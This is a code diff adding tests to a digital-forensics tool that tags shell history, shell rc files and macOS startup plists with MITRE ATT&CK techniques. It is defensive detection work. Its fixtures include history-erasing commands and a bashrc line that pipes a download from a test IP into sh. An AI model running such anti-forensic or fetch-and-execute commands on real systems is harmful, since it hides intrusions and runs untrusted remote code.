@@ -39,6 +39,35 @@ def test_shell_histories(tmp_path):
     assert [(r["timestamp"], r["Command"]) for r in rows] == [("2026-10-26T07:33:20Z", "whoami"), (None, "plain")]
 
 
+def test_history_clearing_is_t1070_003(tmp_path):
+    from rowanholt.process.extractions.mitre_tagger import history_off
+    for clearing in ("history -c", "unset HISTFILE", "set +o history", "export HISTSIZE=0", "HISTFILE=/dev/null",
+                     "rm -f ~/.bash_history", "cat /dev/null > ~/.bash_history", "ln -sf /dev/null ~/.zsh_history"):
+        assert history_off([clearing]), clearing
+    for everyday in ("history | grep ssh", "HISTCONTROL=ignoreboth", "HISTSIZE=1000", "cat ~/.bash_history"):
+        assert not history_off([everyday]), everyday
+    out, raw = host(tmp_path)
+    (raw / "bob+bash_history").write_text("ls\nhistory -c\n")
+    nix.process_bash_history("", "'HOST'", out, "HOST::Linux", "/", "processing", str(raw / "bob+bash_history"))
+    assert [r["techniques"] for r in table(out, "bob+bash_history")] == [[], ["T1059.004", "T1070.003"]]
+    assert "T1070.003" in (Path(out) / "mitre_techniques.txt").read_text().split()
+
+
+def test_a_users_rc_file_keeps_only_the_lines_that_matter(tmp_path):
+    out, raw = host(tmp_path)
+    (raw / "admin+bashrc").write_text("# set +o history\nalias ll='ls -la'\nset +o history\n"
+                                      "curl http://198.51.100.23/x | sh\n")
+    assert nix.is_shell_rc(str(raw / "admin+bashrc")) and not nix.is_shell_rc(str(raw / "admin+bash_history"))
+    nix.process_shell_rc("", "'HOST'", out, "HOST::macOS", "/", "processing", str(raw / "admin+bashrc"))
+    rows = table(out, "shell_rc")
+    assert [(r["LineNumber"], r["Flag"], r["techniques"]) for r in rows] == [
+        (3, "disables shell history", ["T1070.003"]), (4, "suspicious command", ["T1546.004"])]
+    assert {"T1070.003", "T1546.004"} <= set((Path(out) / "mitre_techniques.txt").read_text().split())
+    (raw / "alice+zshrc").write_text("export PATH=$HOME/bin:$PATH\n")
+    nix.process_shell_rc("", "'HOST'", out, "HOST::macOS", "/", "processing", str(raw / "alice+zshrc"))
+    assert len(table(out, "shell_rc")) == 2  # an everyday rc file adds nothing
+
+
 def test_group(tmp_path):
     out, raw = host(tmp_path)
     (raw / "group").write_text("root:x:0:\nsudo:x:27:bob,alice\n")
@@ -63,3 +92,18 @@ def test_auth_log(tmp_path):
     nix.process_logs("", "'HOST'", out, "HOST::Linux", "/", "processing", str(raw / "var+log+auth.log"), {}, [])
     [line] = table(out, "logs/var+log+auth.log")
     assert line["Device"] == "lab" and "198.51.100.77" in line["Message"]
+
+
+def test_a_startup_item_is_tagged_even_when_its_plist_cant_be_read(tmp_path):
+    from rowanholt.process import mac
+    out, raw = host(tmp_path)
+    (raw / "plists").mkdir()
+    (raw / "plists" / "startupitems+EvilStartup.plist").write_text("")
+    (raw / "plists" / "startupitems+StartupParameters.plist").write_text('{\n Description = "Start atomic";\n}\n')
+    (raw / "plists" / "launchagents+broken.plist").write_text("not a plist")
+    for name in ("startupitems+EvilStartup.plist", "startupitems+StartupParameters.plist", "launchagents+broken.plist"):
+        mac.process_plist("", "'HOST'", out, "HOST::macOS", "/", "processing", str(raw / "plists" / name))
+    cooked = Path(out) / "HOST" / "artefacts" / "cooked" / "plists"
+    assert sorted(p.name for p in cooked.iterdir()) == ["startupitems+EvilStartup.plist.jsonl",
+                                                       "startupitems+StartupParameters.plist.jsonl"]
+    assert (Path(out) / "mitre_techniques.txt").read_text().split() == ["T1037.005"]
